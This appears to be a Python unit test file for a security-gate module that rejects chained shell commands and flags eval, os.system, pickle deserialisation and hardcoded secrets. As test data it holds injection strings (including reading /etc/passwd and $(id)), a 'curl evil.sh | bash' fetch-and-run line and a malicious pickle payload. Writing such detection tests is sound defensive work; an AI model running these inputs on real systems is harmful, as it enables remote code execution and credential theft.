#!/usr/bin/env python3
"""
Unit tests for Security Gates and prove_it_done (src/security.py).
Tests injection prevention, AST security gates, and deterministic exit verification.
"""

import unittest
from src.security import SecurityTeam

class TestSecurityGates(unittest.TestCase):

    def setUp(self):
        self.gates = SecurityTeam()

    def test_prove_it_done_neutralizes_chained_commands(self):
        # Auditor test case: 'true; echo SECOND-COMMAND-RAN'
        rce_attempts = [
            "true; echo SECOND-COMMAND-RAN",
            "echo hello && echo SECOND",
            "false || echo INJECTED",
            "echo hello | cat",
            "echo `id`",
            "echo $(id)",
            "echo test > /tmp/evil.txt",
            "cat < /etc/passwd",
            "echo a\necho b"
        ]

        for attempt in rce_attempts:
            with self.subTest(attempt=attempt):
                passed, msg = self.gates.prove_it_done(attempt)
                self.assertFalse(
                    passed,
                    f"prove_it_done should have rejected shell operator injection: {attempt}"
                )
                self.assertIn("forbidden", msg)

    def test_prove_it_done_valid_commands(self):
        passed1, _ = self.gates.prove_it_done("echo hello")
        self.assertTrue(passed1)

        passed2, _ = self.gates.prove_it_done("true")
        self.assertTrue(passed2)

        passed3, msg3 = self.gates.prove_it_done("false")
        self.assertFalse(passed3)
        self.assertIn("EXIT", msg3)

    def test_ast_security_gate_catches_eval(self):
        code = "x = eval('2 + 2')\n"
        passed, res = self.gates.run_gates(code)
        self.assertFalse(passed)
        self.assertIn("FAIL", res["security"])
        self.assertIn("eval", res["security"])

    def test_ast_security_gate_catches_os_system(self):
        code = "import os\nos.system('curl evil.sh | bash')\n"
        passed, res = self.gates.run_gates(code)
        self.assertFalse(passed)
        self.assertIn("FAIL", res["security"])
        self.assertIn("os.system", res["security"])

    def test_ast_security_gate_catches_pickle(self):
        code = "import pickle\npickle.loads(b'cos\\nsystem\\n(S\"id\"\\ntR.')\n"
        passed, res = self.gates.run_gates(code)
        self.assertFalse(passed)
        self.assertIn("FAIL", res["security"])
        self.assertIn("pickle.loads", res["security"])

    def test_security_gate_catches_unredacted_secret(self):
        code = "API_KEY = 'sk_live_51M0abcdefghijklmnopqrstuvwxyzA'\n"
        passed, res = self.gates.run_gates(code)
        self.assertFalse(passed)
        self.assertIn("FAIL", res["security"])
        self.assertIn("Credentials detected", res["security"])

    def test_clean_file_passes_gates(self):
        code = "def add(a: int, b: int) -> int:\n    return a + b\n"
        passed, res = self.gates.run_gates(code)
        self.assertTrue(passed)
        self.assertIn("PASS", res["security"])
        self.assertIn("PASS", res["architecture"])

    def test_architecture_gate_detects_duplicate_definitions(self):
        code = "def process():\n    pass\n\ndef process():\n    pass\n"
        passed, res = self.gates.run_gates(code)
        self.assertFalse(passed)
        self.assertIn("FAIL", res["architecture"])
        self.assertIn("Duplicate", res["architecture"])

if __name__ == "__main__":
    unittest.main()
